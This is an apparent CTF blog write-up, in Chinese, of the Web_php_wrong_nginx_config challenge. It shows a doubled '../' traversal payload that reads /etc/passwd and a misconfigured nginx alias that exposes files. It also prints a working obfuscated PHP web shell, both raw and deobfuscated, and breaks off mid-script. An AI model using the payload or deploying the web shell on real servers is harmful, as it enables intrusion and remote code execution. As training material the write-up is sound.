@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>攻防世界web进阶区Web_php_wrong_nginx_config详解 | wumingzhilian</title>
+  <meta name="author" content="wuming" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    
+      <meta name="description" itemprop="description" content="" />
+    
+    <meta property="og:title" content="攻防世界web进阶区Web_php_wrong_nginx_config详解" />
+    
+    <meta property="og:url" content="http://wumingzhilian.github.to/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAWeb-php-wrong-nginx-config%E8%AF%A6%E8%A7%A3/" />
+    
+      <meta name="twitter:card" content="summary" />
+      <meta name="twitter:site" content="@wumingzhilian" />
+      <meta name="twitter:title" content="攻防世界web进阶区Web_php_wrong_nginx_config详解" />
+      
+        <meta name="twitter:description" content="" />
+      
+      
+    
+  
+  <link rel="alternate" href="atom.xml" type="application/atom+xml">
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="highlight-css" href="/css/highlight.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqusjs.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  
+    <script async src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+    <script async src="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqus.js"></script>
+  
+<meta name="generator" content="Hexo 5.0.0"></head>
+<body class="custom-background">
+    <div id="kratos-wrapper">
+        <div id="kratos-page">
+            <div id="kratos-header">
+                <div class="nav-toggle"><a class="kratos-nav-toggle js-kratos-nav-toggle"><i></i></a></div>
+                <header id="kratos-header-section">
+                    <div class="container">
+                        <div class="nav-header">
+                            <div class="color-logo"><a href="/">wumingzhilian</a></div>
+                            <nav id="kratos-menu-wrap">
+                              <ul id="kratos-primary-menu" class="sf-menu">
+                              
+                                
+                                  <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                
+                              
+                                
+                                  <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                
+                              
+                                
+                                  <li><a href="/friends/"><i class="fa fa-mars-double"></i>好伙伴</a></li>
+                                
+                              
+                                
+                                  <li><a href="/about/"><li><i class="fa fa-paper-plane"></i>关于我</a></li>
+                                
+                              
+                              </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </header>
+            </div>
+
+<div class="kratos-start kratos-hero-2">
+    <!-- <div class="kratos-overlay"></div> -->
+    <div class="kratos-cover kratos-cover-2 text-center">
+        <div class="desc desc2 animate-box">
+            <a href="/"><h2>wumingzhilian</h2><br><span></span></a>
+        </div>
+    </div>
+</div>
+
+<div id="kratos-blog-post">
+    <div class="container">
+            <div class="row">
+                
+<div id="main">
+    <section class="col-md-8">
+    <article>
+        <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                <h1 class="kratos-entry-title text-center">攻防世界web进阶区Web_php_wrong_nginx_config详解</h1>
+                
+                <div class="kratos-post-meta text-center">
+                    <span>
+                    <i class="fa fa-calendar"></i> 2020-08-11
+                    <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/CTF/">CTF</a>
+                    <i class="fa fa-user"></i> 作者 wuming
+                    </span>
+                </div>
+            </header>
+            <div class="kratos-post-content">
+                
+                    <div class="kratos-post-inner-toc">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+                    </div>
+                
+                <hr />
+                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://img-blog.csdnimg.cn/20200810111051342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开发现无论我们输入什么他都会弹出网站建设不完全</p>
+<p>那么我们使用御剑进行扫描，扫描到了admin和robots.txt<br>我们访问admin试试</p>
+<p><img src="https://img-blog.csdnimg.cn/20200810111655855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200810111721491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们接着访问hint.php<br><img src="https://img-blog.csdnimg.cn/20200810111954294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>和Hack.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20200810112422831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个打开直接弹窗</p>
+<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>好嘞，我们正式开搞！<br><img src="https://img-blog.csdnimg.cn/20200810112641209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现这里有一个cookie为0的值，我们改为1<br><img src="https://img-blog.csdnimg.cn/20200810112720440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现成功登录<br><img src="https://img-blog.csdnimg.cn/20200810112748484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>进去瞎点一通，发现，只有管理中心可以改变url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;admin&#x2F;admin.php?file&#x3D;index&amp;ext&#x3D;php</span><br></pre></td></tr></table></figure>
+<p>我们试试文件包含<code>../</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200810113233101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>无论我们加入多少../均不能，猜测是过滤了<br><img src="https://img-blog.csdnimg.cn/20200810113355444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们在正常的url中加入../   ./   /测试<br>发现只有加../和原页面一致，<br>说明他过滤了../<br>而且还是置为空<br>那么我们就可以进行双写绕过<br><code>/admin/admin.php?file=./..././..././..././..././etc/passwd&amp;ext=</code><br>成功包含。<br><img src="https://img-blog.csdnimg.cn/20200811153130222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ext一定不要写东西，因为他是一个后缀，如果写入php,的话，他会按照php进行打开<br>根据<code>hint.php</code>提示包含配置文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">            server &#123;</span><br><span class="line">    listen 8080; <span class="comment">## listen for ipv4; this line is default and implied</span></span><br><span class="line">    listen [::]:8080; <span class="comment">## listen for ipv6</span></span><br><span class="line"></span><br><span class="line">    root /var/www/html;</span><br><span class="line">    index index.php index.html index.htm;</span><br><span class="line">    port_in_redirect off;</span><br><span class="line">    server_name _;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/</span></span><br><span class="line">    <span class="comment">#server_name localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$time_iso8601</span> ~ <span class="string">&quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;</span>) &#123;</span><br><span class="line">       <span class="built_in">set</span> <span class="variable">$year</span> <span class="variable">$1</span>;</span><br><span class="line">       <span class="built_in">set</span> <span class="variable">$month</span> <span class="variable">$2</span>;</span><br><span class="line">       <span class="built_in">set</span> <span class="variable">$day</span> <span class="variable">$3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span></span><br><span class="line">    sendfile off;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$http_x_forwarded_for_filt</span> ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) &#123;</span><br><span class="line">                <span class="built_in">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$1</span>???;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add stdout logging</span></span><br><span class="line"></span><br><span class="line">    access_log /var/<span class="built_in">log</span>/nginx/<span class="variable">$hostname</span>-access-<span class="variable">$year</span>-<span class="variable">$month</span>-<span class="variable">$day</span>.<span class="built_in">log</span> openshift_log;</span><br><span class="line">    error_log /var/<span class="built_in">log</span>/nginx/error.log info;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">        <span class="comment"># as directory, then fall back to index.html</span></span><br><span class="line">        try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?q=<span class="variable">$uri</span>&amp;<span class="variable">$args</span>;</span><br><span class="line">        server_tokens off;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?q=<span class="variable">$uri</span>&amp;<span class="variable">$args</span>;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        fastcgi_param SCRIPT_NAME <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">        fastcgi_param REMOTE_ADDR <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ /\. &#123;</span><br><span class="line">            log_not_found off;</span><br><span class="line">            deny all;</span><br><span class="line">    &#125;</span><br><span class="line">    location /web-img &#123;</span><br><span class="line">        <span class="built_in">alias</span> /images/;</span><br><span class="line">        autoindex on;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~* \.(ini|docx|pcapng|doc)$ &#123;  </span><br><span class="line">         deny all;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    include /var/www/nginx[.]conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现倒数几行location /web-img开启了目录浏览 autoindex on;.</p>
+<p>那么我们进行访问。/web-img/<br><img src="https://img-blog.csdnimg.cn/20200811154038814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>alias用法<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/kinginblue/article/details/50748683">https://blog.csdn.net/kinginblue/article/details/50748683</a></p>
+<p>也就是说 alias 会丢弃掉 location 的路径<br>因此 alias 后面的路径是从系统根目录开始的<br><img src="https://img-blog.csdnimg.cn/20200811154647146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200811154729776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现hack.php.bak<br>下载好发现，如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$U=<span class="string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;</span><br><span class="line">$q=<span class="string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;</span><br><span class="line">$M=<span class="string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;</span><br><span class="line">$z=<span class="string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;</span><br><span class="line">$k=<span class="string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;</span><br><span class="line">$o=<span class="string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;</span><br><span class="line">$N=<span class="string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;</span><br><span class="line">$C=<span class="string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line">$j=<span class="string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;</span><br><span class="line">$R=str_replace(<span class="string">&#x27;rO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);</span><br><span class="line">$J=<span class="string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;</span><br><span class="line">$x=<span class="string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;</span><br><span class="line">$f=str_replace(<span class="string">&#x27;|U&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);</span><br><span class="line">$g=create_function(<span class="string">&#x27;&#x27;</span>,$f);</span><br><span class="line">$g();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是一个后门页面，网上有师傅们的源码<br>php混淆后门<br><a href="">https://www.cnblogs.com/go2bed/p/5920811.html</a><br><img src="https://img-blog.csdnimg.cn/20200811155413910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们这儿只有一个F,输出看看，<br><img src="https://img-blog.csdnimg.cn/20200811155435834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整理一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$kh=<span class="string">&quot;42f7&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>) </span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">            $o.=$t &#123;</span><br><span class="line">                $i</span><br><span class="line">            &#125;</span><br><span class="line">            ^$k &#123;</span><br><span class="line">                $j</span><br><span class="line">            &#125;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">    $u=parse_url($rr);</span><br><span class="line">    parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">    $q=array_values($q);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">    <span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s=&amp;$_SESSION;</span><br><span class="line">        $ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        $sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        $i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        $h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">        <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">            $s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            $p=$ss($p,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">            $s[$i].=$p;</span><br><span class="line">            $e=strpos($s[$i],$f);</span><br><span class="line">            <span class="keyword">if</span>($e) &#123;</span><br><span class="line">                $k=$kh.$kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">                $o=ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们找大佬的脚本测试一下<br>php混淆后门</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 